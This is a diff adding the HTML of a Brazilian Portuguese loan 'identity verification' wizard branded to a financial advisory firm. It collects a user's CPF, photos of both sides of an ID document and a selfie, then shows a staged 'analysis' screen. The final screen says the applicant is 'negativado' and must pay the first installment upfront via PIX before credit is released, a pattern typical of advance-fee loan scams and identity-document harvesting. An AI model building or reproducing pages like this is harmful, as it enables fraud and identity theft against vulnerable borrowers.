@@ -1,0 +1,264 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <script src="/js/clarity.js"></script>
+  <script src="/js/gtag.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+  <meta name="theme-color" content="#1351b4">
+  <title>13.212.952 A&G ASSESSORIA FINANCEIRA LTDA · Verificação de Identidade</title>
+  <link rel="icon" type="image/png" href="/images/credpix-logo.png">
+  <link rel="stylesheet" href="/simular/assets/index-CvkAEMz2.css">
+  <link rel="stylesheet" href="/css/credpix-brand.css">
+  <script src="/js/credpix-boot.js"></script>
+  <script src="/js/credpix-brand.js"></script>
+  <link rel="stylesheet" href="/kyc/kyc.css">
+  <link rel="stylesheet" href="/css/credpix-footer.css">
+</head>
+<body data-credpix-legal-footer="skip">
+  <div id="app" class="app-shell">
+    <header class="brand-header">
+      <div class="brand-logo">
+        <span class="credpix-brand-text credpix-brand-text--wizard" aria-label="13.212.952 A&G ASSESSORIA FINANCEIRA LTDA"><span class="credpix-brand-cnpj">13.212.952</span> <span class="credpix-brand-name">A&G ASSESSORIA FINANCEIRA LTDA</span></span>
+      </div>
+      <div class="seal">Verificação segura</div>
+    </header>
+
+    <main class="wizard-main">
+      <!-- Step 1: CPF -->
+      <section id="step-cpf" class="wizard-frame screen-enter">
+        <div class="progress-row">
+          <div class="progress-meta"><span>Verificação KYC</span><span class="progress-pct">1/8</span></div>
+          <div class="progress-track"><div class="progress-fill" style="width:12%"></div></div>
+        </div>
+        <div>
+          <h1 class="screen-title">Confirme seu CPF</h1>
+          <p class="screen-sub">Informe seu CPF para localizar sua solicitação de empréstimo.</p>
+        </div>
+        <div class="field">
+          <label for="cpfInput">CPF</label>
+          <input id="cpfInput" class="input" type="tel" inputmode="numeric" placeholder="000.000.000-00" maxlength="14" autocomplete="off">
+          <p id="cpfError" class="field-error hidden"></p>
+        </div>
+        <button id="cpfBtn" class="btn btn-primary btn-lg btn-block" type="button">Continuar</button>
+      </section>
+
+      <!-- Step 2: Request details -->
+      <section id="step-details" class="wizard-frame screen-enter hidden">
+        <div class="progress-row">
+          <div class="progress-meta"><span>Sua solicitação</span><span class="progress-pct">2/8</span></div>
+          <div class="progress-track"><div class="progress-fill" style="width:25%"></div></div>
+        </div>
+        <div>
+          <h1 class="screen-title">Solicitação encontrada</h1>
+          <p class="screen-sub">Confira os dados da sua proposta antes de verificar sua identidade.</p>
+        </div>
+        <div class="summary-card">
+          <div class="summary-row"><span>Nome</span><strong id="detailNome">—</strong></div>
+          <div class="summary-row"><span>CPF</span><strong id="detailCpf">—</strong></div>
+          <div class="summary-row"><span>Valor solicitado</span><strong id="detailValor">—</strong></div>
+          <div class="summary-row"><span>Parcelas</span><strong id="detailParcelas">—</strong></div>
+          <div class="summary-row"><span>Valor da parcela</span><strong id="detailParcelaValor">—</strong></div>
+          <div class="summary-row"><span>Total</span><strong id="detailTotal">—</strong></div>
+        </div>
+        <button id="detailsBtn" class="btn btn-primary btn-lg btn-block" type="button">Iniciar verificação</button>
+      </section>
+
+      <!-- Step 3: Document type -->
+      <section id="step-doctype" class="wizard-frame screen-enter hidden">
+        <div class="progress-row">
+          <div class="progress-meta"><span>Documento</span><span class="progress-pct">3/8</span></div>
+          <div class="progress-track"><div class="progress-fill" style="width:37%"></div></div>
+        </div>
+        <div>
+          <h1 class="screen-title">Escolha o documento</h1>
+          <p class="screen-sub">Selecione o documento que você vai fotografar.</p>
+        </div>
+        <div class="stack-options">
+          <button class="option-btn" type="button" data-doc="rg">
+            <div class="opt-body"><div class="opt-title">RG</div><div class="opt-sub">Registro Geral</div></div>
+            <span class="opt-arrow">→</span>
+          </button>
+          <button class="option-btn" type="button" data-doc="cnh">
+            <div class="opt-body"><div class="opt-title">CNH</div><div class="opt-sub">Carteira de motorista</div></div>
+            <span class="opt-arrow">→</span>
+          </button>
+          <button class="option-btn" type="button" data-doc="passaporte">
+            <div class="opt-body"><div class="opt-title">Passaporte</div><div class="opt-sub">Documento internacional</div></div>
+            <span class="opt-arrow">→</span>
+          </button>
+        </div>
+      </section>
+
+      <!-- Step 4: Front photo -->
+      <section id="step-front" class="wizard-frame screen-enter hidden">
+        <div class="progress-row">
+          <div class="progress-meta"><span>Frente do documento</span><span class="progress-pct">4/8</span></div>
+          <div class="progress-track"><div class="progress-fill" style="width:50%"></div></div>
+        </div>
+        <div>
+          <h1 class="screen-title">Foto da frente</h1>
+          <p class="screen-sub">Posicione a frente do <span id="docLabelFront">documento</span> dentro da moldura.</p>
+        </div>
+        <div class="camera-wrap" data-side="front">
+          <video class="camera-video" playsinline muted></video>
+          <canvas class="camera-canvas hidden"></canvas>
+          <img class="camera-preview hidden" alt="Preview frente">
+          <div class="camera-overlay"></div>
+        </div>
+        <div class="camera-actions">
+          <button class="btn btn-secondary btn-block camera-capture" type="button">Capturar foto</button>
+          <button class="btn btn-outline btn-block camera-retake hidden" type="button">Tirar novamente</button>
+          <button class="btn btn-primary btn-lg btn-block camera-continue hidden" type="button">Continuar</button>
+          <label class="btn btn-link btn-block camera-upload">
+            Enviar da galeria
+            <input type="file" accept="image/*" capture="environment" class="hidden">
+          </label>
+        </div>
+      </section>
+
+      <!-- Step 5: Back photo -->
+      <section id="step-back" class="wizard-frame screen-enter hidden">
+        <div class="progress-row">
+          <div class="progress-meta"><span>Verso do documento</span><span class="progress-pct">5/8</span></div>
+          <div class="progress-track"><div class="progress-fill" style="width:62%"></div></div>
+        </div>
+        <div>
+          <h1 class="screen-title">Foto do verso</h1>
+          <p class="screen-sub">Agora fotografe o verso do <span id="docLabelBack">documento</span>.</p>
+        </div>
+        <div class="camera-wrap" data-side="back">
+          <video class="camera-video" playsinline muted></video>
+          <canvas class="camera-canvas hidden"></canvas>
+          <img class="camera-preview hidden" alt="Preview verso">
+          <div class="camera-overlay"></div>
+        </div>
+        <div class="camera-actions">
+          <button class="btn btn-secondary btn-block camera-capture" type="button">Capturar foto</button>
+          <button class="btn btn-outline btn-block camera-retake hidden" type="button">Tirar novamente</button>
+          <button class="btn btn-primary btn-lg btn-block camera-continue hidden" type="button">Continuar</button>
+          <label class="btn btn-link btn-block camera-upload">
+            Enviar da galeria
+            <input type="file" accept="image/*" capture="environment" class="hidden">
+          </label>
+        </div>
+      </section>
+
+      <!-- Step 6: Selfie -->
+      <section id="step-selfie" class="wizard-frame screen-enter hidden">
+        <div class="progress-row">
+          <div class="progress-meta"><span>Selfie</span><span class="progress-pct">6/8</span></div>
+          <div class="progress-track"><div class="progress-fill" style="width:75%"></div></div>
+        </div>
+        <div>
+          <h1 class="screen-title">Selfie de verificação</h1>
+          <p class="screen-sub">Olhe para a câmera e mantenha o rosto centralizado.</p>
+        </div>
+        <div class="camera-wrap camera-selfie" data-side="selfie">
+          <video class="camera-video" playsinline muted></video>
+          <canvas class="camera-canvas hidden"></canvas>
+          <img class="camera-preview hidden" alt="Preview selfie">
+          <div class="camera-overlay camera-overlay--round"></div>
+        </div>
+        <div class="camera-actions">
+          <button class="btn btn-secondary btn-block camera-capture" type="button">Capturar selfie</button>
+          <button class="btn btn-outline btn-block camera-retake hidden" type="button">Tirar novamente</button>
+          <button class="btn btn-primary btn-lg btn-block camera-continue hidden" type="button">Enviar documentos</button>
+          <label class="btn btn-link btn-block camera-upload">
+            Enviar da galeria
+            <input type="file" accept="image/*" capture="user" class="hidden">
+          </label>
+        </div>
+      </section>
+
+      <!-- Step 7: Analysis -->
+      <section id="step-analysis" class="wizard-frame screen-enter hidden">
+        <div class="progress-row">
+          <div class="progress-meta"><span>Análise</span><span class="progress-pct">7/8</span></div>
+          <div class="progress-track"><div class="progress-fill" id="analysisProgress" style="width:75%"></div></div>
+        </div>
+        <div class="analysis-header">
+          <div class="big-spinner"></div>
+          <h1 class="screen-title">Analisando seus documentos</h1>
+          <p class="screen-sub">Estamos verificando autenticidade, qualidade e correspondência facial.</p>
+        </div>
+        <div class="timeline" id="analysisTimeline">
+          <div class="timeline-step idle" data-step="0">
+            <div class="marker"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6"/></svg></div>
+            <div class="label"><div class="title">Validação do documento</div><div class="sub">OCR e autenticidade</div></div>
+          </div>
+          <div class="timeline-step idle" data-step="1">
+            <div class="marker"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
+            <div class="label"><div class="title">Reconhecimento facial</div><div class="sub">Comparando selfie com documento</div></div>
+          </div>
+          <div class="timeline-step idle" data-step="2">
+            <div class="marker"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
+            <div class="label"><div class="title">Consulta de segurança</div><div class="sub">Bases públicas e antifraude</div></div>
+          </div>
+          <div class="timeline-step idle" data-step="3">
+            <div class="marker"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><path d="M22 4L12 14.01l-3-3"/></svg></div>
+            <div class="label"><div class="title">Resultado final</div><div class="sub">Consolidando verificação</div></div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Step 8: Negativado notice -->
+      <section id="step-negativado" class="wizard-frame screen-enter hidden">
+        <div class="progress-row">
+          <div class="progress-meta"><span>Resultado</span><span class="progress-pct">8/8</span></div>
+          <div class="progress-track"><div class="progress-fill" style="width:100%"></div></div>
+        </div>
+        <div class="alert-box alert-warning">
+          <div class="alert-icon">⚠️</div>
+          <div>
+            <h2 class="alert-title">Verificação concluída com ressalva</h2>
+            <p class="alert-text">Identificamos que você está <strong>negativado</strong>. Para liberar o crédito, é necessário pagar a <strong>primeira parcela adiantada</strong> do seu empréstimo.</p>
+          </div>
+        </div>
+        <div class="summary-card">
+          <div class="summary-row"><span>Valor da 1ª parcela</span><strong id="negParcela">—</strong></div>
+          <div class="summary-row"><span>Forma de pagamento</span><strong>PIX</strong></div>
+        </div>
+        <p class="field-hint">Após o pagamento, sua solicitação seguirá para liberação do crédito.</p>
+        <button id="negativadoBtn" class="btn btn-primary btn-lg btn-block" type="button">Pagar primeira parcela via PIX</button>
+      </section>
+
+      <!-- Step 9: PIX Payment -->
+      <section id="step-payment" class="wizard-frame screen-enter hidden">
+        <div>
+          <h1 class="screen-title">Pagamento PIX</h1>
+          <p class="screen-sub">Pague a primeira parcela para concluir a verificação.</p>
+        </div>
+        <div class="pix-card">
+          <div class="pix-amount-row">
+            <span>Total a pagar</span>
+            <strong id="pixAmount">—</strong>
+          </div>
+          <div id="pixLoading" class="pix-loading">
+            <div class="big-spinner"></div>
+            <p>Gerando PIX...</p>
+          </div>
+          <div id="pixContent" class="hidden">
+            <div class="pix-qr-wrap"><img id="pixQr" src="" alt="QR Code PIX"></div>
+            <div class="pix-code-box"><span id="pixCodeDisplay"></span></div>
+            <input type="hidden" id="pixCode">
+            <button id="pixCopyBtn" class="btn btn-primary btn-lg btn-block" type="button">Copiar código PIX</button>
+            <div id="pixStatus" class="pix-status hidden">
+              <div class="spinner"></div>
+              <span>Aguardando pagamento...</span>
+            </div>
+            <div id="pixSuccess" class="pix-success hidden">Pagamento confirmado! Redirecionando...</div>
+            <div id="pixTimer" class="pix-timer"></div>
+          </div>
+          <div id="pixError" class="field-error hidden"></div>
+        </div>
+      </section>
+    </main>
+    <footer class="credpix-site-footer">
+      <p>13.212.952 A&G ASSESSORIA FINANCEIRA LTDA — CNPJ: 13.212.952/0001-10. Todos os serviços são de responsabilidade da empresa acima identificada.</p>
+    </footer>
+  </div>
+  <script src="/kyc/app.js"></script>
+</body>
+</html>
+
